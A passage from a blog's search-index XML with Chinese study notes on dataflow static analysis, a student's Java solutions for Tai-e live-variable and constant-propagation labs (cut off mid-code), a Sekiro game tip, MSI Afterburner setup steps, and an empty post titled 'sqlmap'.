        <content type="html"><![CDATA[<h3 id="概述">概述</h3><ol type="1"><li><p><strong>静态分析（Static Analysis）</strong> 是指在实际运行程序<em>P</em> 之前，通过分析静态程序 <em>P</em>本身来推测程序的行为，并判断程序是否满足某些特定的<strong>性质（Property）</strong> Q</p><p>我们会关心的<strong>程序性质</strong>可能有：</p><ul><li>程序P是否会产生私有<code>信息泄漏</code>（Private InformationLeak），或者说是否存在访问控制漏洞（Access Control Venerability）；</li><li>程序P是否有<code>空指针的解引用</code>(Null PointerDereference)操作，更一般的，是否会发生不可修复的运行时错误（RuntimeError）；</li><li>程序P中的<code>类型转换</code>（Type Cast）是否都是安全的；</li><li>程序P中是否存在可能无法满足的<code>断言</code>（AssersionError）；</li><li>程序P中是否存在<code>死代码</code>（Dead Code,即控制流在任何情况下都无法到达的代码）；</li></ul></li></ol><h4 id="静态分析的类型">静态分析的类型</h4><ol type="1"><li><p>让我们感兴趣的性质，基本都是非平凡的性质</p></li><li><p><code>Rice定理（Rice Theorem）</code></p><p>对于使用 <strong>递归可枚举（Recursively Enumerable）</strong>的语言描述的程序，其任何 <strong>非平凡（Non-trivial）</strong>的性质都是无法完美确定的。</p></li><li><p>一个完美的静态分析给出的答案应当既是对的，也是全的</p></li><li><p>记程序 <em>P</em> 的关于性质 Q 的静态分析S为 <strong>Sound的静态分析（Sound Static Analysis）</strong> ，当且仅当 S 给出的答案集合A和 <em>P</em> 关于 Q* 的真相集合 T 之间满足 T<em>⊆</em>A，这种分析策略也称作<strong>过近似（Over-approximation）</strong></p></li><li><p>记程序 <em>P</em> 的关于性质 <em>Q</em> 的静态分析 <em>S</em> 为<strong>Complete 的静态分析（Complete Static Analysis）</strong>，当且仅当 <em>S</em> 给出的答案集合 A 和 <em>P</em> 关于 <em>Q</em>的真相集合 <em>T</em> 之间满足 <em>A</em>⊆<em>T</em>，这种分析策略也称作<strong>欠近似（Under-approximation）</strong></p></li><li><p>下面我们再看一个 <code>Sound</code> 的静态分析的例子：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> input then    x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span>    x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>output x<span class="token punctuation">;</span></code></pre><p>我们可以有两种 <code>Sound</code> 的静态分析：</p><ul><li>当 <code>input</code> 为 <code>true</code> ，<code>x</code> 为<code>1</code> ，当 <code>input</code> 为 <code>false</code> ，<code>x</code> 为 <code>0</code> ；</li><li><code>x</code> 为 <code>0</code> 或 <code>1</code></li></ul></li></ol><h4 id="抽象">抽象</h4><ol type="1"><li><code>状态函数</code>定义了我们如何将具体值转化为抽象值，<code>转移函数</code>定义了我们如何基于抽象值去<strong>解析（Evaluate）</strong> 表达式</li><li>⊤表示 <strong>未确定（Unknown）</strong> 值， ⊥表示<strong>未定义（Undefined）</strong>值</li></ol><h3 id="数据流分析及其应用">数据流分析及其应用</h3><h4 id="数据流分析初步">数据流分析初步</h4><ol type="1"><li>我们将采用过近似策略，输出所有可能为真的信息的数据流分析称为<strong>可能性分析（May Analysis）</strong>，将采用欠近似策略，输出信息必然为真的数据流分析称为<strong>必然性分析（Must Analysis</strong></li><li>不同的数据流分析应用应当有<ol type="1"><li>不同的数据抽象（Data Abstraction）;</li><li>不同的流安全近似策略——过近似或者欠近似；</li><li>不同的转移函数（TransferFunction，见定义1.8）和控制流处理方法（Control-Flow Handlings）</li></ol></li></ol><h4 id="定义可达性分析">定义可达性分析</h4><ol type="1"><li>我们称在程序点 p p处的一个<code>定义 d</code> 到达（Reach） 了程序点q ，如果存在一条从 p 到 q的“<code>路径</code>”（控制流），在这条路径上，定义 d 未被<code>覆盖（Kill）</code> 。称分析每个程序点处能够到达的定义的过程为<code>定义可达性分析</code>（Reaching Definition Analysis）<imgsrc="https://raw.githubusercontent.com/Jf710001011/pictureBed/main/img/rd.4673b4a7.png"alt="rd.4673b4a7" /></li><li>定义可达性分析可以应用于检测程序中可能存在的<code>未被定义的变量</code>。比如说，我们在DFG 的入口处为每个变量 v赋予一个<code>伪定义（Dummy Definition）</code>，如果程序中存在某个使用变量v 的程序点 p ，且 v 的伪定义能够到达程序点 p，那么我们就可以分析出变量v可能在定义之前被使用，也就是可能程序存在变量未定义的错误</li><li>在DFG中，虽然存在着<strong>多条</strong>控制流，但是，实际程序执行的时候，只有唯一的一条控制流会被<strong>真实的执行</strong>，而这条控制流并不一定刚好是我们<strong>用于</strong>得到定义可达结论的那一条。</li></ol><h4 id="活跃变量分析">活跃变量分析</h4><ol type="1"><li>在程序点 p 处，某个变量 v 的变量值（VariableValue）可能在之后的某条控制流中<strong>被用到</strong>，我们就称变量 v是程序点 p 处的 <code>活变量（Live Variable）</code>，否则，我们就称变量 v 为程序点 p 处的 死变量（Dead Variable）。分析在各个程序点处所有的变量是死是活的分析，称为<code>活跃变量分析（Live Variable Analysis）</code><ol type="1"><li>程序点 p 处的变量 v 是活变量，当且仅当在 CFG 中存在某条从 p开始的路径，在这条路径上变量 v 被使用了，并且在 v 被使用之前， v未被重定义<img src="https://s2.loli.net/2023/12/10/2gGBFmVhEyCvTuz.png"alt="lv.22a3dea9" /></li><li>我们判断活跃变量的标准不是这个变量之后有没有可能用到，而是这个变量当前所<strong>储存的值</strong>在之后有没有可能被用到</li></ol></li><li>逆序分析</li></ol><h4 id="可用表达式分析">可用表达式分析</h4><ol type="1"><li><p>一个表达式（Expression）<code>x op y</code>在程序点 p 处是<strong>可用的（Avaliable）</strong> ，如果：</p><ul><li><strong>所有</strong> 的从程序入口到程序点 p的路径都<strong>必须</strong> 经过 <code>x op y</code>表达式的评估（Evaluation），并且</li><li>在最后一次 <code>x op y</code> 的评估之后，没有 x或者y的重定义（Redefinition）。</li></ul><p>对于程序中每个程序点处的可用表达式的分析，我们称之为<strong>可用表达式分析（Avaliable Expression Analysis）</strong>。</p></li></ol><h4 id="总结">总结</h4><ol type="1"><li>数据流分析的基本过程<ol type="1"><li>问题描述：<ul><li>定义要研究的问题，从而确定分析顺序（正向还是逆向）和估计方式（过近似还是欠近似）；</li></ul></li><li>数据抽象：<ul><li>确定抽象数据状态集（也就是数据流值集），从而确定定义域；</li></ul></li><li>约束分析：<ul><li>考虑语意约束，确定状态转移方程；</li><li>考虑控制流约束，确定交汇操作符的含义；</li></ul></li><li>算法设计：<ul><li>根据上述分析设计算法，我们目前只学了迭代算法，还可以有其他的算法设计；</li></ul></li><li>算法分析：<ul><li>分析算法的正确性和复杂度</li></ul></li></ol></li><li>三种数据流分析应用对比<imgsrc="https://s2.loli.net/2023/12/10/b7hPQ3EUtCmnZFk.png"alt="image-20231210151847727" /></li></ol><h4 id="数据流分析基础">数据流分析基础</h4><ol type="1"><li><p>迭代算法：<strong>可能性（May Analysis）正向（ForwardAnalysis）数据流分析的迭代（Iterative）算法</strong><imgsrc="https://s2.loli.net/2023/12/23/r8iP9cGNY2zMWwa.png"alt="image-20231223232625278" /></p></li><li><p>偏序<img src="https://s2.loli.net/2023/12/23/Oyxne6G2sDQdU15.png"alt="image-20231223232707662" /></p></li><li><p>格<img src="https://s2.loli.net/2023/12/23/WGRkrBvhI2ZuCFa.png"alt="image-20231223232731268" /></p></li><li><p>全格<img src="https://s2.loli.net/2023/12/23/JbSCRW1UTm3l7jq.png"alt="image-20231223232940418" /></p></li><li><p>不动点<imgsrc="https://s2.loli.net/2023/12/23/TBQyvGfSub7L8Mm.png"alt="image-20231223233019021" /></p><ol type="1"><li>称 <em>x</em> 是一个函数 <em>f</em> 的 <strong>不动点（FixedPoint）</strong> ，如果 f<em>(</em>x<em>)=</em>x 。</li></ol></li><li><p>工作表算法：<strong>可能性（May Analysis）正向（ForwardAnalysis）数据流分析的工作表（Worklist）算法</strong><imgsrc="https://s2.loli.net/2023/12/23/Jg7Cp2ZLR8FyaAN.png"alt="image-20231223233303179" /></p><ol type="1"><li>工作表算法是对迭代算法的优化，用一个集合储存下一次遍历会发生变化的基块，这样，已经达到不动点的基块就可以不用重复遍历了。这里需要提一下的是worklist 最好采用去重的集合实现，不然的话， worklist中可能有重复的基块</li><li>算法的最后一行只将输出状态发生变化的基块的后继，也就是在下一轮当中<strong>输入状态会发生变化</strong>的基块加入工作表，这是由于只有当输入状态发生变化时，输出状态才会发生辩护</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Static Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Programming Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2023/12/09/sqlmap/"/>
      <url>/2023/12/09/sqlmap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sekiro-只狼</title>
      <link href="/2023/12/09/sekiro/"/>
      <url>/2023/12/09/sekiro/</url>
      
        <content type="html"><![CDATA[<h3 id="苇名弦一郎前后">苇名弦一郎前后</h3><ul><li><p>学习雷电奉还之处-就是打完boss日本武士那个地方<imgsrc="https://s2.loli.net/2023/07/14/CKm4qBxjus3baTU.jpg"alt="20230714073931_1" /></p></li><li><p>一心不在楼上？</p><p>与皇子对话，两个选项都对话一遍。结束对话，再跟跟皇子多次对话</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sekiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSI-afterburner</title>
      <link href="/2023/12/09/msi-afeterburner/"/>
      <url>/2023/12/09/msi-afeterburner/</url>
      
        <content type="html"><![CDATA[<h3 id="install">Install</h3><ol type="1"><li><ahref="https://www.msi.com/Landing/afterburner/graphics-cards">heredonwload</a></li><li>全部勾选上再安装:<code>rtss</code></li><li>两次安装弹窗是不同内容的安装</li></ol><h3 id="界面">界面</h3><ol type="1"><li>主界面<img src="https://s2.loli.net/2023/11/28/wgdBbY9vrhKnuNa.png"alt="image-20231128024848034" /><ol type="1"><li>进入设置<imgsrc="https://s2.loli.net/2023/11/28/5EK9XgBrZ2xjRmS.png"alt="image-20231128024931157" /></li></ol></li><li>click <code>On-Screen Display</code><ol type="1"><li>勾选显示系统时间</li></ol></li><li>click <code>monitoring</code><imgsrc="https://s2.loli.net/2023/11/28/CBxpEMyUWKm4lsH.png"alt="image-20231128025451288" /><ol type="1"><li>字体颜色设置，<ol type="1"><li>click <strong>...</strong> next to "text</li><li>设置，可设置字体颜色和透明度<imgsrc="https://s2.loli.net/2023/11/28/OnJ4jNbQ71L238l.png"alt="image-20231128025658889" /></li></ol></li></ol></li><li>rtss<img src="https://s2.loli.net/2023/11/28/V5ENUzxwDRqMZ32.png"alt="image-20231128025804954" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lab-Static-Analysis</title>
      <link href="/2023/12/09/lab-static-analysis/"/>
      <url>/2023/12/09/lab-static-analysis/</url>
      
        <content type="html"><![CDATA[<h3 id="活跃变量分析和迭代求解器">1. 活跃变量分析和迭代求解器</h3><h4 id="回顾">回顾</h4><ol type="1"><li>transer function<imgsrc="https://s2.loli.net/2023/08/26/fo29NwqQgGMXOIr.png"alt="image-20230826182222303" /></li></ol><h4 id="任务">任务</h4><ol type="1"><li>第一个任务是实现 <code>LiveVariableAnalysis</code> 中的如下API：<img src="https://s2.loli.net/2023/08/26/MeRVIOUlGwE2nj1.webp"alt="corresponding algorithm location" /><ul><li>SetFact newBoundaryFact(CFG)</li><li>SetFact newInitialFact()</li><li>void meetInto(SetFact,SetFact)</li><li>boolean transferNode(Stmt,SetFact,SetFact)</li></ul></li><li>第二个任务是实现上面提到的 <code>Solver</code> 类的两个方法：</li></ol><ul><li>Solver.initializeBackward(CFG,DataflowResult)</li><li>IterativeSolver.doSolveBackward(CFG,DataflowResult)</li></ul><h4 id="实现">实现</h4><ol type="1"><li><p>项目结构<imgsrc="https://s2.loli.net/2023/08/26/XVpeZTI1QywYsj7.png"alt="image-20230826205741382" /></p></li><li><p>需要了解的类：</p><ol type="1"><li><p><code>pascal.taie.analysis.dataflow.fact.DataflowResult</code>用于维护数据流分析的CFG 中的 fact。你可以通过它的 API 获取、设置 CFG 节点的<code>IN facts</code> 和 <code>OUT facts</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">pascal<span class="token punctuation">.</span>taie<span class="token punctuation">.</span>analysis<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>fact<span class="token punctuation">.</span></span>DataflowResult</span></code></pre></li><li><p><code>pascal.taie.analysis.graph.cfg.CFG</code></p></li><li><p><code>pascal.taie.analysis.dataflow.solver.Solver</code></p></li><li><p><code>pascal.taie.analysis.dataflow.solver.IterativeSolver</code></p></li></ol></li><li><p><code>pascal/taie/analysis/dataflow/analysis/LiveVariableAnalysis.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> <span class="token function">newBoundaryFact</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> <span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">meetInto</span><span class="token punctuation">(</span><span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> fact<span class="token punctuation">,</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>    target<span class="token punctuation">.</span><span class="token function">union</span><span class="token punctuation">(</span>fact<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">transferNode</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span> stmt<span class="token punctuation">,</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> in<span class="token punctuation">,</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>    <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> newInFact <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SetFact</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    newInFact<span class="token punctuation">.</span><span class="token function">union</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">getDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">LValue</span> def <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">getDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>def <span class="token keyword">instanceof</span>  <span class="token class-name">Var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            newInFact<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Var</span><span class="token punctuation">)</span> def<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">RValue</span> use<span class="token operator">:</span> stmt<span class="token punctuation">.</span><span class="token function">getUses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>use <span class="token keyword">instanceof</span> <span class="token class-name">Var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            newInFact<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Var</span><span class="token punctuation">)</span> use<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newInFact<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>newInFact<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>pascal/taie/analysis/dataflow/solver/IterativeSolver.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">initializeBackward</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">,</span> <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Fact</span><span class="token punctuation">></span></span> result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>    result<span class="token punctuation">.</span><span class="token function">setInFact</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newBoundaryFact</span><span class="token punctuation">(</span>cfg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">isExit</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">setInFact</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">setOutFact</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   </code></pre></li><li><p><code>IterativeSolver.doSolveBackward(CFG,DataflowResult)</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doSolveBackward</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">,</span> <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Fact</span><span class="token punctuation">></span></span> result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - finish me</span>       <span class="token keyword">boolean</span> changed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>       <span class="token keyword">while</span> <span class="token punctuation">(</span>changed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        changed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>           <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> node <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">isExit</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> succNode <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                analysis<span class="token punctuation">.</span><span class="token function">meetInto</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">getInFact</span><span class="token punctuation">(</span>succNode<span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">getOutFact</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>analysis<span class="token punctuation">.</span><span class="token function">transferNode</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">getInFact</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">getOutFact</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> changed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="常量传播和-worklist-求解器">2：常量传播和 Worklist 求解器</h3><h4 id="需要理解的类">需要理解的类</h4><ol type="1"><li><p><code>pascal.taie.ir.exp.IntLiteral</code>： 每个 IntLiteral类的实例都表示一个程序中的整数字面量</p></li><li><p><code>pascal.taie.ir.exp.BinaryExp</code>：这个类代表程序中的二元表达式。这个类的各个子类对应了表 1中的不同种类的二元表达式，并且每个子类中都有一个内部<ahref="https://docs.oracle.com/javase/tutorial/java/javaOO/enum.html">枚举类型openin new window</a>用于表示该类支持的运算符。例如枚举类型<code>ArithmeticExp.Op</code>就代表了<code>ArithmeticExp</code>（算术表达式类）所支持的运算符，也就是<code>+ - * /</code> 和 <code>%</code>。</p><ol type="1"><li><p>需要指出的是，在 Tai-e 中，<code>BinaryExp</code>的两个操作数都是 <code>Var</code> 类型的。例如下面的语句</p><pre class="language-java" data-language="java"><code class="language-java">x <span class="token operator">=</span> y <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span></code></pre><p>在 Tai-e 中会被转化成如下的 IR：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">%</span>intconst0 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>     <span class="token comment">// %intconst* are temp variables introduced</span>x <span class="token operator">=</span> y <span class="token operator">+</span> <span class="token operator">%</span>intconst0<span class="token punctuation">;</span> <span class="token comment">// by Tai-e to hold constant int values</span></code></pre></li></ol></li><li><p><code>pascal.taie.ir.stmt.DefinitionStmt</code></p><p>这是 Stmt 的一个子类。它表示了程序中所有的赋值语句，（即形如 x = y 或x = m(…) 的语句）。</p></li><li><p><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code></p><p>这是具体数据流分析算法需要实现的接口。和<ahref="https://tai-e.pascal-lab.net/pa1.html">作业 1</a>一样，它会被求解器调用。</p></li><li><p><code>pascal.taie.analysis.dataflow.analysis.constprop.Value</code></p><p>这个类表示了常量分析中格上的抽象值 (见第 6 讲课件的第 238页)。它的代码和注释解释了它的用法。你应该用下列的静态方法获取格上抽象值（即该类的实例）：</p><p><code>Value getNAC():</code> 返回 NAC <code>Value getUndef()</code>:返回 UNDEF <code>Value makeConstant(int)</code>:返回给定整数在格上对应的抽象值</p></li><li><p><code>pascal.taie.analysis.dataflow.analysis.constprop.CPFact</code></p><p>这个类表示常量传播中的 datafacts，即一个从变量（Var）到格上抽象值（Value）的映射</p></li><li><p><code>pascal.taie.analysis.dataflow.analysis.constprop.ConstantPropagation</code></p><p>这个类实现了DataflowAnalysis。你需要在其中编写完整的常量传播算法</p></li></ol><h4 id="实现-1">实现</h4><ol type="1"><li><p><code>A2/tai-e/src/main/java/pascal/taie/analysis/dataflow/analysis/constprop/ConstantPropagation.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">CPFact</span> <span class="token function">newBoundaryFact</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">CPFact</span> fact <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CPFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span></span> vars <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Var</span> <span class="token keyword">var</span> <span class="token operator">:</span> vars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">canHoldInt</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            fact<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Value</span><span class="token punctuation">.</span><span class="token function">getNAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> fact<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">CPFact</span> <span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CPFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">meetInto</span><span class="token punctuation">(</span><span class="token class-name">CPFact</span> fact<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Find a bug here, "fact.ketSet()" instead of "target.ketSet()".</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Var</span> <span class="token keyword">var</span> <span class="token operator">:</span> fact<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        target<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token 